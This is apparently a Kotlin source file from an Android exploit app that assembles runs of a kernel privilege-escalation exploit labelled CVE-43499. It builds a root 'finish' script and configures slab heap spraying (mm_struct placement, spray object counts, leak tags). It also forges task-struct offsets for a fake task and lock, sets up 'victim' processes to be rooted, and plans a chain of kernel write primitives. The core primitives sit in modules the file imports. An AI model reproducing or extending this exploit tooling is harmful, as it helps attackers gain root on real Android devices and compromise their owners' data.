package com.ghostlock.app.ui.screen.module.backends

import android.content.Context
import com.ghostlock.app.core.flow.FlowProgress
import android.os.Process
import com.ghostlock.app.data.cve43499.A301SoDebugConfig
import com.ghostlock.app.data.cve43499.A301SoDebugParameters
import com.ghostlock.app.backend.cve43499.generator.Cve43499RouteGeneratorFactory
import com.ghostlock.app.backend.cve43499.finish.FinishExecutionEvidence
import com.ghostlock.app.backend.cve43499.finish.FinishHandoff
import com.ghostlock.app.backend.cve43499.flow.Cve43499AndroidWriteVerifier
import com.ghostlock.app.backend.cve43499.flow.Cve43499GeneratedInputs
import com.ghostlock.app.backend.cve43499.flow.Cve43499PostPlacementGenerator
import com.ghostlock.app.backend.cve43499.flow.Cve43499UnsupportedWriteVerifier
import com.ghostlock.app.backend.cve43499.flow.Cve43499VictimRestarter
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteChain
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteChainPolicy
import com.ghostlock.app.backend.cve43499.generator.Cve43499WriteGenerator
import com.ghostlock.app.backend.cve43499.flow.Cve43499WritePlanner
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteTargetSource
import com.ghostlock.app.backend.cve43499.perf.Cve43499JniPerfNative
import com.ghostlock.app.backend.cve43499.perf.Cve43499PerfTargetSource
import com.ghostlock.app.backend.cve43499.owned.KernelsuGuard
import com.ghostlock.app.backend.cve43499.owned.KernelsuGuardResult
import com.ghostlock.app.backend.cve43499.owned.ProcessLimits
import com.ghostlock.app.backend.cve43499.owned.ProcessLimitsOutcome
import com.ghostlock.app.backend.cve43499.victim.Cve43499JniVictimLimits
import com.ghostlock.app.backend.cve43499.victim.Cve43499CommonVictimRuntime
import com.ghostlock.app.backend.cve43499.victim.Cve43499JniVictimRuntime
import com.ghostlock.app.core.victim.VictimProtocol
import com.ghostlock.app.backend.cve43499.victim.Cve43499JniVictimTargetSource
import com.ghostlock.app.backend.cve43499.victim.VICTIM_HELPER_FILE_NAME
import com.ghostlock.app.backend.cve43499.victim.VictimSession
import com.ghostlock.app.data.cve43499.DebugVictimTransport
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteVerifier
import com.ghostlock.app.backend.cve43499.flow.Flow43499KernelLayout
import com.ghostlock.app.backend.cve43499.flow.Flow43499Request
import com.ghostlock.app.backend.cve43499.flow.Flow43499Route
import com.ghostlock.app.backend.cve43499.flow.Flow43499RunSpec
import com.ghostlock.app.backend.cve43499.owned.LandingConfig
import com.ghostlock.app.backend.cve43499.owned.PlacementConfig
import com.ghostlock.app.jni.Native43499ActorSetup
import com.ghostlock.app.jni.Native43499PrimitiveSpec
import java.io.File
import java.util.UUID

/**
 * UI → 后端（G4L-6）的收尾脚本交接适配器。
 *
 * 职责边界：
 * - **复用**既有收尾契约：`FinishState.toRootScript` 渲染整段脚本、`FinishScriptStore`
 *   写 `files/finish/run.sh`；本适配器不改写脚本内容、不改既有 UI 行为；
 * - 生成后端可接收的不可变 [FinishHandoff]（路径 + 内容副本 + SHA-256），后端据此
 *   对拍「同一个脚本对象」，不解析 terminal 输出；
 * - 不启动攻击、不调用 Native、不做验收判定；验收由后端 `FinishAcceptance` 完成；
 * - **A1 finish victim-only**：不再提供 App/su 执行入口；脚本只由 rooted victim
 *   （`VictimFinish`/victim `execScript`）执行，runId 由 Flow 绑定。
 *
 * 阶段：G4L-6 finish；仅被显式调用，不接默认入口。
 */
internal object FinishHandoffAdapter {
    /**
     * 把当前收尾配置落盘并生成交接对象。
     *
     * @param context 应用上下文（委托给 [FinishScriptStore] 解析 `files/finish/run.sh`）。
     * @param state 当前收尾选项（只读；本函数不修改 UI 状态）。
     * @param managerBinary 已解析的 root 管理器二进制路径；null 表示由脚本自行定位。
     * @param staged slot.id → 已暂存外部路径；与既有收尾路径一致。
     * @param logPath 脚本内 `LOG=` 目标；预览用 `/dev/null`，运行时由执行层传入 memfd 路径。
     * @return 冻结交接对象；渲染/落盘/读回失败返回 null（调用方按 `finish-handoff-invalid`）。
     * @note 脚本是临时物：删除仍走既有 [FinishScriptStore.delete]，本适配器不额外持有文件。
     */
    internal fun build(
        context: Context,
        state: FinishState,
        managerBinary: String? = null,
        staged: Map<String, String> = emptyMap(),
        logPath: String = "/dev/null",
    ): FinishHandoff? {
        val script = runCatching {
            state.toRootScript(managerBinary, staged, logPath)
        }.getOrNull() ?: return null
        val file = runCatching {
            FinishScriptStore.write(context, script)
        }.getOrNull() ?: return null
        val scriptBytes = runCatching { file.readBytes() }.getOrNull() ?: return null
        return FinishHandoff.create(file.absolutePath, scriptBytes)
    }

    /* A1 finish victim-only：本适配器不再构造/传递 FinishExecution 执行 seam。
     * 收尾脚本只由 rooted victim（VictimFinish/execScript）执行；旧 execute/executor
     * helper 已删除，防止生产路径误用 App/su 执行。 */

    /**
     * 删除收尾脚本对象；日志保留（与既有收尾契约一致）。
     *
     * @param context 应用上下文。
     */
    internal fun delete(context: Context) {
        FinishScriptStore.delete(context)
    }
}

/**
 * UI 侧请求组装结果（task-32：Gate 通过后直接交给 Flow）。
 *
 * @note 具名拒绝用于「执行期输入缺失」，不是 allow/deny 决策（那是 Gate 的职责）。
 */
internal sealed interface Cve43499RequestBuild {
    /** 请求组装成功，可直接交给 `Flow43499Impl().run(request)`。 */
    data class Built(val request: Flow43499Request) : Cve43499RequestBuild

    /** 执行期输入缺失/交接无效；reasons 稳定可检索。 */
    data class Refused(val reasons: List<String>) : Cve43499RequestBuild
}

/**
 * 43499 的 UI 侧请求工厂：debug 阶段经 data 层 [A301SoDebugConfig] loader 取值对象组装 Flow 请求。
 *
 * 职责边界（task-32/task-37）：
 * - 本对象属于 UI 适配层，不属于 Flow/生命周期层；
 * - 只做输入组装与具名校验，不做执行、不做 allow/deny；
 * - 缺参（debug 配置/generator/session）⇒ fail-closed 具名 reasons，不伪造参数；
 * - R3b：三路 generator（multicast/pselect/tcp）由 [Cve43499RouteGeneratorFactory]
 *   按 debug 配置 `injection.primitive` **单 route** 注入（无 fallback）；缺参即拒绝。
 *
 * @note 阶段：R3b；真机未验证；generator 生成的 landing/frame/地址不表达攻击成功，
 *   验收仍由后端 FinishAcceptance 判定。
 */
internal object Cve43499RequestFactory {
    /** 运行 id 前缀；脚本 marker 内容会写入完整 runId。 */
    internal const val RUN_ID_PREFIX: String = "cve43499-ui-"

    /** 收尾 handoff 构建失败（执行期）的 reason 前缀。 */
    internal const val REASON_HANDOFF_PREFIX: String =
        "cve43499-run-execution:finish-handoff:"

    /** handoff 构建失败的第二段文本。 */
    internal const val REASON_HANDOFF_BUILD_FAILED: String = "build-failed"

    /** 物理/legacy 输入在执行期仍缺失的 reason 前缀。 */
    internal const val REASON_INPUTS_INCOMPLETE_PREFIX: String =
        "cve43499-run-execution:inputs-incomplete:"

    /** debug 配置读取/校验失败的 reason 前缀（fail-closed）。 */
    internal const val REASON_DEBUG_CONFIG_PREFIX: String =
        "cve43499-run-execution:debug-config:"

    /** P0c generator 尚未注入时的 reason 前缀（frame/addresses/payload）。 */
    internal const val REASON_GENERATOR_PREFIX: String =
        "cve43499-run-execution:generator-missing:"

    /** R3d 多写链输入不完整时的 reason 前缀。 */
    internal const val REASON_WRITE_CHAIN_PREFIX: String =
        "cve43499-run-execution:write-chain:"

    /** R4/批 B2 JNI victim 路径配置不完整时的 reason 前缀（fail-closed）。 */
    internal const val REASON_VICTIM_JNI_PREFIX: String =
        "cve43499-run-execution:victim-jni:"

    /** legacy transport（session/prepare/discover）缺失字段名。 */
    internal const val LEGACY_INPUT_FIELDS: String = "session,prepare,discover"

    /**
     * 组装一次运行的 Flow 请求。
     *
     * @param context 应用上下文（读 assets debug 配置 / 构建收尾 handoff）。
     * @param finishState 当前收尾配置。
     * @param debugParameters 已解析的 debug 参数；null ⇒ 从 assets 读取。
     * @param payloadFactory P0c payload generator seam；null ⇒ 具名拒绝（不伪造）。
     * @param primitiveFactory P0c address/frame generator seam；null ⇒ 具名拒绝。
     * @param generatorFactory R3 post-placement generator 工厂（三路）；缺省按 debug 配置
     *   `injection.primitive` 选择真实 generator。返回 null ⇒ 冻结兼容路径
     *   （[payloadFactory]/[primitiveFactory] 必填）。
     * @param sessionFactory legacy Session seam；null ⇒ 依 debug 参数构造 debug Session。
     * @param finishTimeoutMs rooted victim 内 finish 脚本的有界等待（毫秒；>0）。
     * @return Built（可执行）或 Refused（具名缺参/不支持）。
     */
    @Suppress("LongMethod", "LongParameterList")
    internal fun build(
        context: Context,
        finishState: FinishState = FinishConfig.state,
        debugParameters: A301SoDebugParameters? = null,
        execution: com.ghostlock.app.data.cve43499.DebugExecutionParameters? = null,
        payloadFactory: (A301SoDebugParameters) -> ByteArray? = { null },
        primitiveFactory: (A301SoDebugParameters) -> Native43499PrimitiveSpec? = { null },
        generatorFactory: ((A301SoDebugParameters) -> Cve43499PostPlacementGenerator)? = null,
        sessionFactory: ((A301SoDebugParameters) -> Flow43499Request.Session)? = null,
        writeTargetSource: Cve43499WriteTargetSource? = null,
        writePlannerFactory: ((A301SoDebugParameters) -> Cve43499WritePlanner)? = null,
        writeVerifier: Cve43499WriteVerifier = Cve43499AndroidWriteVerifier(),
        victimRestarter: Cve43499VictimRestarter? = null,
        finishTimeoutMs: Long = Flow43499RunSpec.DEFAULT_FINISH_TIMEOUT_MS,
        /* B6：debug `finish.pre_dispatch_settle_ms`（缺省 2000ms）。 */
        debugFinishSettleMs: Long = 2_000L,
        /** 运行期事实行 seam（append-only；默认 NONE，不参与控制流）。 */
        progress: FlowProgress = FlowProgress.NONE,
    ): Cve43499RequestBuild {
        val debug = debugParameters ?: runCatching {
            A301SoDebugConfig.load(context)
        }.getOrElse { problem ->
            return Cve43499RequestBuild.Refused(
                listOf(
                    REASON_DEBUG_CONFIG_PREFIX +
                        (problem.message ?: problem::class.java.simpleName),
                ),
            )
        }
        val handoff = runCatching {
            FinishHandoffAdapter.build(context = context, state = finishState)
        }.getOrNull() ?: return Cve43499RequestBuild.Refused(
            listOf(REASON_HANDOFF_PREFIX + REASON_HANDOFF_BUILD_FAILED),
        )
        /* 设备相关执行几何（mm_struct/snitch/派生对象数）由 debug 配置派生；
         * 调用方显式传入时以显式值为准（测试/宿主注入）。 */
        val effectiveExecution = runCatching {
            execution ?: A301SoDebugConfig.executionParameters(debug)
        }.getOrElse { problem ->
            return Cve43499RequestBuild.Refused(
                listOf(REASON_DEBUG_CONFIG_PREFIX + "execution:" +
                    (problem.message ?: problem::class.java.simpleName)),
            )
        }
        val generator = runCatching {
            generatorFactory?.invoke(debug)
                ?: Cve43499RouteGeneratorFactory.create(
                    debug = debug,
                    execution = effectiveExecution,
                    ghostPid = Process.myPid(),
                )
        }.getOrElse { problem ->
            return Cve43499RequestBuild.Refused(
                listOf(
                    REASON_GENERATOR_PREFIX + "factory:" +
                        (problem.message ?: problem::class.java.simpleName),
                ),
            )
        }
        /* R4/批 B2：`injection.victim=jni-spawn` 时构造通用 helper runtime + JNI
         * self-perf target source；缺 perf 配置即具名拒绝（不静默回退旧路径）。
         * 默认 `injection.victim=process` ⇒ 旧 ProcessVictim 路径不变。 */
        /* task-86/A1-A2a：`injection.victim=common` ⇒ 公共 core VictimSession+VictimNativeJni
         * helper（opt-in；process/jni-spawn 路径不删/不禁用）。43499 不使用 98260 script 载体。 */
        val commonVictimRuntime: Cve43499CommonVictimRuntime? =
            if (debug.injection.victim == DebugVictimTransport.COMMON) {
                val perf = debug.perf
                val rawSizeBytes = if (perf != null && perf.enabled == 1) {
                    victimRawSizeBytes(execution = effectiveExecution, perf = perf)
                        ?: return Cve43499RequestBuild.Refused(
                            listOf(REASON_VICTIM_JNI_PREFIX + "raw-size"),
                        )
                } else {
                    VictimProtocol.RAW_HEADER_BYTES.toLong()
                }
                val helperPath = File(
                    context.applicationContext.applicationInfo.nativeLibraryDir,
                    VICTIM_HELPER_FILE_NAME,
                ).absolutePath
                Cve43499CommonVictimRuntime(
                    helperPath = helperPath,
                    rawSizeBytes = rawSizeBytes,
                )
            } else {
                null
            }
        val jniVictimRuntime: Cve43499JniVictimRuntime? =
            if (debug.injection.victim == DebugVictimTransport.JNI_SPAWN) {
                val perf = debug.perf
                if (perf == null || perf.enabled != 1) {
                    return Cve43499RequestBuild.Refused(
                        listOf(REASON_VICTIM_JNI_PREFIX + "perf-disabled"),
                    )
                }
                val rawSizeBytes = victimRawSizeBytes(execution = effectiveExecution, perf = perf)
                    ?: return Cve43499RequestBuild.Refused(
                        listOf(REASON_VICTIM_JNI_PREFIX + "raw-size"),
                    )
                val helperPath = File(
                    context.applicationContext.applicationInfo.nativeLibraryDir,
                    VICTIM_HELPER_FILE_NAME,
                ).absolutePath
                Cve43499JniVictimRuntime(
                    helperPath = helperPath,
                    rawSizeBytes = rawSizeBytes,
                )
            } else {
                null
            }
        /* R3e：perf target source 只在 debug 配置 `perf.enabled=1` 时构造；
         * 默认 `perf.enabled=0`（且 release 无 debug 资产）⇒ 单 W1 路径不变。
         * R4：JNI victim 路径优先用 helper self-perf 源（不混用 App 进程跨任务源）。 */
        val effectiveTargetSource = writeTargetSource
            ?: if (jniVictimRuntime != null || commonVictimRuntime != null) {
                val perf = debug.perf ?: return Cve43499RequestBuild.Refused(
                    listOf(REASON_VICTIM_JNI_PREFIX + "perf-disabled"),
                )
                Cve43499JniVictimTargetSource(
                    samplerProvider = {
                        jniVictimRuntime?.currentSampler()
                            ?: commonVictimRuntime?.currentSampler()
                    },
                    perf = perf,
                    execution = effectiveExecution,
                )
            } else {
                debug.perf?.let { perf ->
                    if (perf.enabled == 1) {
                        Cve43499PerfTargetSource(
                            native = Cve43499JniPerfNative,
                            perf = perf,
                            execution = effectiveExecution,
                        )
                    } else {
                        null
                    }
                }
            }
        val writePlanner = if (effectiveTargetSource == null) {
            null
        } else {
            runCatching {
                writePlannerFactory?.invoke(debug)
                    ?: Cve43499RouteGeneratorFactory.createPlanner(
                        debug = debug,
                        execution = effectiveExecution,
                        ghostPid = Process.myPid(),
                    )
            }.getOrElse { problem ->
                return Cve43499RequestBuild.Refused(
                    listOf(
                        REASON_WRITE_CHAIN_PREFIX + "planner:" +
                            (problem.message ?: problem::class.java.simpleName),
                    ),
                )
            }
        }
        return buildFromDebug(
            debug = debug,
            execution = effectiveExecution,
            handoff = handoff,
            payload = payloadFactory(debug),
            primitive = primitiveFactory(debug),
            session = sessionFactory?.invoke(debug),
            generator = generator,
            writeTargetSource = effectiveTargetSource,
            writePlanner = writePlanner,
            writeVerifier = writeVerifier,
            victimRestarter = victimRestarter,
            expectedUid = debug.finish.expectedUid,
            finishPreDispatchSettleMs = debugFinishSettleMs,
            finishTimeoutMs = finishTimeoutMs,
            victimFactory = jniVictimRuntime?.let { runtime ->
                { runtime.newVictimSession() }
            } ?: commonVictimRuntime?.let { runtime ->
                { runtime.newVictimSession() }
            },
            victimTransport = debug.injection.victim,
            /* G06/G07：生产 seam（W1 前执行；loaded/失败 fail-closed）。 */
            ksuCheck = { KernelsuGuard().check() },
            processLimitsRaiser = { ProcessLimits().raise() },
            /* G01：DIRTY/retained fail-stop（evidence 先落盘/fsync，再 killProcess）。 */
            failStopEnabled = debug.failStop.enabled == 1,
            progress = progress,
            failStopEvidenceSink = failStopEvidenceSink(context),
        )
    }

    /**
     * G01 evidence 落盘口：logcat + `filesDir/fail-stop.log` append/fsync。
     *
     * @param context 应用上下文（只用于 filesDir）。
     * @return evidence sink（在 terminate 之前调用；失败不阻塞终止）。
     * @note 必须可落盘：write→flush→fd.sync；任何异常吞掉（终止不能被 IO 失败阻止）。
     */
    private fun failStopEvidenceSink(
        context: Context,
    ): (Map<String, String>) -> Unit = { evidence ->
        val line = evidence.entries.joinToString(",") { it.key + "=" + it.value }
        runCatching { android.util.Log.e("GLK-FAILSTOP", line) }
        runCatching {
            val file = File(context.filesDir, "fail-stop.log")
            java.io.FileOutputStream(file, true).use { output ->
                output.write((line + "\n").toByteArray(Charsets.UTF_8))
                output.flush()
                output.fd.sync()
            }
        }
    }

    /**
     * @param execution execution 参数（pageSize/ring 几何唯一来源）。
     * @param perf perf debug 参数。
     * @return helper raw memfd 容量（ring 数据区 + raw 头）；非法返回 null。
     * @note raw 容量由 Kotlin 显式给出（helper/Native 不推导）；只容一次采样窗口。
     */
    private fun victimRawSizeBytes(
        execution: com.ghostlock.app.data.cve43499.DebugExecutionParameters,
        perf: com.ghostlock.app.data.cve43499.DebugPerfParameters,
    ): Long? {
        if (execution.pageSize <= 0L || perf.ringPages <= 0L) return null
        if (execution.pageSize > Int.MAX_VALUE.toLong() / perf.ringPages) return null
        val ringBytes = execution.pageSize * perf.ringPages
        if (ringBytes <= 0L || ringBytes > Int.MAX_VALUE.toLong() - 16L) return null
        val rawSizeBytes = ringBytes + 16L
        if (rawSizeBytes > Cve43499JniVictimLimits.RAW_MAX_BYTES) return null
        return rawSizeBytes
    }

    /**
     * 纯函数式组装（可单测，不触 Android）：从已解析 debug 参数 + generator seam 构造请求。
     *
     * 数据流（R3a-1）：注入 [generator] 时 landing/primitive 不再在放置前构造，而由 Flow
     * 在 placement 完成后以 `(facts) -> landing+primitive` 生成；[payload]/[primitive]
     * 仅服务未注入 generator 的冻结兼容路径（历史 P0b 接线/单测）。
     *
     * @param debug 已解析的 debug 参数。
     * @param execution debug 注入执行参数（决定 route 与静态调度参数）。
     * @param handoff 收尾脚本冻结对象。
     * @param payload P0c payload generator 结果；generator 为 null 时必填。
     * @param primitive P0c frame/addresses generator 结果；generator 为 null 时必填。
     * @param session legacy Session（null ⇒ 用 debug 参数构造 debug Session）。
     * @param generator R3 post-placement generator（三路之一）；null ⇒ 冻结兼容路径。
     * @param writeTargetSource R3d victim task 地址源；null ⇒ 不启用多写链（单 W1）。
     * @param writePlanner R3d 写请求规划器；多写链启用时必填。
     * @param writeVerifier R3d 阶段验收口（默认 UNSUPPORTED；生产 W1 用 Android 判据）。
     * @param victimRestarter R3d W3 链轮次>1 的 victim 重生成 seam；null ⇒ 链轮次固定 1。
     * @param debugWriteParameters R3d 轮次/等待策略参数；null ⇒ debug 显式常量。
     * @param finishTimeoutMs R3f rooted victim 内 finish 脚本的有界等待（毫秒；>0）。
     * @param victimFactory R4/批 B2 可选 victim 会话工厂（jni-spawn 路径注入 helper
     *   适配器；null ⇒ lifecycle 默认 ProcessVictimSession，行为不变）。
     * @return Built 或 Refused（冻结路径缺 payload/primitive、generator/planner 缺失）。
     */
    @Suppress("LongMethod", "LongParameterList", "UNUSED_PARAMETER")
    internal fun buildFromDebug(
        debug: A301SoDebugParameters,
        execution: com.ghostlock.app.data.cve43499.DebugExecutionParameters,
        handoff: FinishHandoff,
        payload: ByteArray?,
        primitive: Native43499PrimitiveSpec?,
        session: Flow43499Request.Session? = null,
        generator: Cve43499PostPlacementGenerator? = null,
        writeTargetSource: Cve43499WriteTargetSource? = null,
        writePlanner: Cve43499WritePlanner? = null,
        writeVerifier: Cve43499WriteVerifier = Cve43499UnsupportedWriteVerifier,
        victimRestarter: Cve43499VictimRestarter? = null,
        debugWriteParameters: com.ghostlock.app.data.cve43499.DebugWriteChainParameters? = null,
        finishTimeoutMs: Long = Flow43499RunSpec.DEFAULT_FINISH_TIMEOUT_MS,
        victimFactory: (() -> VictimSession)? = null,
        ksuCheck: (() -> KernelsuGuardResult)? = null,
        processLimitsRaiser: (() -> ProcessLimitsOutcome)? = null,
        failStopEnabled: Boolean = false,
        failStopTerminator: ((String) -> Unit)? = null,
        failStopEvidenceSink: ((Map<String, String>) -> Unit)? = null,
        /* task-84/86：debug-only 期望 uid / B6 settle / victim 传输透传。 */
        expectedUid: Long = 0L,
        finishPreDispatchSettleMs: Long = 2_000L,
        victimTransport: com.ghostlock.app.data.cve43499.DebugVictimTransport =
            com.ghostlock.app.data.cve43499.DebugVictimTransport.PROCESS,
        progress: FlowProgress = FlowProgress.NONE,
    ): Cve43499RequestBuild {
        /* R3b：三路均已放开；注入 generator 时 route 由 generator 自证（单 route，
           无 fallback）。未注入 generator 的冻结兼容路径仍要求 payload+primitive。 */
        val runId = RUN_ID_PREFIX + UUID.randomUUID().toString()
        val allocation = execution.allocationSize
        /* legacy floor 语义（Lead 2026-10-27 (a)）：mm_struct 尺寸不要求整除
         * allocation；objects=floor(allocation/mm)。A301SO 1024 整除不变；
         * mondrian 960 ⇒ 34（legacy2 support.cpp:564 同式）。 */
        val objects = A301SoDebugConfig.placementObjects(allocation, execution.mmStructSize)
        if (allocation <= 0L || execution.mmStructSize <= 0L || objects == null) {
            return Cve43499RequestBuild.Refused(
                listOf(REASON_DEBUG_CONFIG_PREFIX + "placement-geometry"),
            )
        }
        val frozenInputs: Cve43499GeneratedInputs?
        if (generator == null) {
            val payloadBytes = payload ?: return Cve43499RequestBuild.Refused(
                listOf(REASON_GENERATOR_PREFIX + "payload"),
            )
            val primitiveSpec = primitive ?: return Cve43499RequestBuild.Refused(
                listOf(REASON_GENERATOR_PREFIX + "primitive-frame-addresses"),
            )
            if (payloadBytes.size.toLong() != execution.reclaimPayloadSize) {
                return Cve43499RequestBuild.Refused(
                    listOf(REASON_GENERATOR_PREFIX + "payload-size-mismatch"),
                )
            }
            frozenInputs = Cve43499GeneratedInputs(
                landing = LandingConfig(
                    finalBytes = payloadBytes,
                    contentGeneration = execution.contentGeneration,
                    timeoutNanos = execution.timeoutNanos,
                    socketSendBufferSize = execution.socketSendBufferSize,
                    reclaimSendLimit = execution.reclaimSendLimit,
                    reclaimPayloadSize = execution.reclaimPayloadSize,
                    fillByte = execution.fillByte,
                    pageAcceptRequired = execution.pageAcceptRequired,
                    pageAcceptOffset = execution.pageAcceptOffset,
                    pageAcceptBit = execution.pageAcceptBit,
                ),
                primitive = primitiveSpec,
            )
        } else {
            frozenInputs = null
        }
        val placement = PlacementConfig(
            placementCpu = execution.placementCpu,
            measurementCpu = execution.measurementCpu,
            timeoutNanos = execution.timeoutNanos,
            pageSize = execution.pageSize,
            allocationSize = allocation,
            slabOrder = execution.slabOrder,
            mmStructSize = execution.mmStructSize,
            mmPartials = execution.mmPartials,
            prepareSlabs = execution.prepareSlabs,
            snitchCollisions = debug.kernelsnitch.collisions.toLong(),
            pollUs = execution.pollUs,
            requiredAlignment = execution.requiredAlignment,
            scanLowerBound = execution.scanLowerBound,
            scanUpperBound = execution.scanUpperBound,
            scanStep = execution.scanStep,
            scanRoundLimit = execution.scanRoundLimit,
            objectsPerSlab = objects,
            prepareObjectCount = objects * execution.prepareSlabs.toInt(),
            sprayObjectCount = objects * (1 + execution.mmPartials.toInt()),
            preObjectCount = objects - 1,
            postObjectCount = objects,
            identityStart = execution.identityStart,
            identityEnd = execution.identityEnd,
            leakTagNibble = execution.leakTagNibble,
            leakTagShift = execution.leakTagShift,
            stagingCapacity = execution.stagingCapacity,
            maxContextEntries = execution.maxContextEntries,
            maxObjectsPerSlab = execution.maxObjectsPerSlab,
            maxMeasurementRounds = execution.maxMeasurementRounds,
        )
        val actorSetup = Native43499ActorSetup(
            ownerCpu = execution.ownerCpu,
            waiterCpu = execution.waiterCpu,
            consumerCpu = execution.consumerCpu,
            ownerPriority = execution.ownerPriority,
            waiterPriority = execution.waiterPriority,
            consumerPriority = execution.consumerPriority,
            threadCount = execution.threadCount,
            prepareTimeoutNanos = execution.prepareTimeoutNanos,
            parkedTimeoutNanos = execution.parkedTimeoutNanos,
            executionTimeoutNanos = execution.executionTimeoutNanos,
            shutdownTimeoutNanos = execution.shutdownTimeoutNanos,
            consumerMax = execution.consumerMax,
            consumerBurst = execution.consumerBurst,
            lockPiSpinNs = execution.lockPiSpinNs,
            pollUs = execution.pollUs,
            setupSettleUs = execution.setupSettleUs,
            requeueExpected = execution.requeueExpected,
            disarmSpinLimit = execution.disarmSpinLimit,
        )
        val writeGenerator = generator as? Cve43499WriteGenerator
        val writeChain: Cve43499WriteChain? = if (writeTargetSource == null) {
            null
        } else {
            val planner = writePlanner ?: return Cve43499RequestBuild.Refused(
                listOf(REASON_WRITE_CHAIN_PREFIX + "planner-missing"),
            )
            if (writeGenerator == null) {
                return Cve43499RequestBuild.Refused(
                    listOf(REASON_WRITE_CHAIN_PREFIX + "write-generator-missing"),
                )
            }
            val parameters = debugWriteParameters
                ?: A301SoDebugConfig.writeChainParameters(debug)
            Cve43499WriteChain(
                targetSource = writeTargetSource,
                planner = planner,
                policy = Cve43499WriteChainPolicy.fromDebug(
                    parameters = parameters,
                    primitive = debug.injection.primitive,
                ),
                primitiveToken = Cve43499RouteGeneratorFactory.token(
                    debug.injection.primitive,
                ),
                verifier = writeVerifier,
                victimRestarter = victimRestarter,
            )
        }
        val spec = Flow43499RunSpec(
            placement = placement,
            actorSetup = actorSetup,
            frozenInputs = frozenInputs,
            handoff = handoff,
            runId = runId,
            postPlacementGenerator = generator,
            writeChain = writeChain,
            writeGenerator = writeGenerator,
            expectedUid = expectedUid,
            finishPreDispatchSettleMs = finishPreDispatchSettleMs,
            victimTransport = victimTransport,
            finishTimeoutMs = finishTimeoutMs,
            victimFactory = victimFactory,
            ksuCheck = ksuCheck,
            processLimitsRaiser = processLimitsRaiser,
            failStopEnabled = failStopEnabled,
            failStopTerminator = failStopTerminator,
            failStopEvidenceSink = failStopEvidenceSink,
        )
        val resolvedSession = session ?: debugSession(debug)
        return Cve43499RequestBuild.Built(
            Flow43499Request(session = resolvedSession, runSpec = spec, progress = progress),
        )
    }


    /**
     * 用 debug 参数构造 legacy transport Session（仅作请求形状；Native runSpec 路径以
     * lifecycle 层参数为准）。generator 批次可替换为真实值。
     *
     * @param debug 已解析的 debug 参数。
     * @return 显式填写 route/stamp/limits/consumer/timing 的 Session。
     */
    private fun debugSession(debug: A301SoDebugParameters): Flow43499Request.Session {
        /* task-84：修正错位映射——session 必须使用传入 debug 的执行参数（含 G08 CPU 覆盖），
         * 不得回落到无参默认。 */
        val execution = A301SoDebugConfig.executionParameters(debug)
        val route = Flow43499Route.MulticastWaiter(
            armRounds = debug.kernelsnitch.collisions.toLong(),
            stampWaiterShift = 0L,
            waiterOff = debug.route.waiterOff,
        )
        return Flow43499Request.Session(
            init = Flow43499Request.Init(
                route = route,
                stamp = Flow43499Request.Stamp(
                    waiterOffset = debug.taskStruct.piLock,
                    taskOffset = debug.taskStruct.tasks,
                    lockOffset = debug.taskStruct.piWaiters,
                    bufferSize = debug.route.bufferSize.toLong(),
                ),
                limits = Flow43499Request.Limits(
                    maxAttempts = execution.multicastOperationBudget,
                    armSequence = execution.multicastArmSequence,
                    armHold = execution.multicastArmHoldNs,
                ),
                timing = Flow43499Request.Timing(
                    parkMs = execution.placementCpu.toLong(),
                    settleUs = execution.pollUs,
                ),
                consumer = Flow43499Request.Consumer(
                    burstCalls = execution.consumerBurst,
                    maxCalls = execution.consumerMax,
                    niceModulus = execution.ownerPriority,
                    policy = execution.waiterPriority,
                ),
                fakeTask = debug.taskStruct.tasks,
                fakeLock = debug.taskStruct.piLock,
            ),
            layout = Flow43499KernelLayout(pointerBytes = 8, slotFakeTask = debug.taskStruct.atomicFlags),
        )
    }

    /**
     * B4：fail-closed readiness/request 校验（单 W1/perf.enabled=0/无 rooted victim 可能）。
     *
     * @param debug 已解析 debug 参数。
     * @return null=可尝试多写链；否则稳定 reason（`unsupported-single-w1:*`，不得标 supported）。
     */
    internal fun unsupportedDebugRunReason(
        debug: com.ghostlock.app.data.cve43499.A301SoDebugParameters,
    ): String? {
        if (debug.perf?.enabled != 1) {
            return "unsupported-single-w1:perf-disabled"
        }
        if (debug.writeChain == null) {
            return "unsupported-single-w1:write-chain-missing"
        }
        return null
    }
}
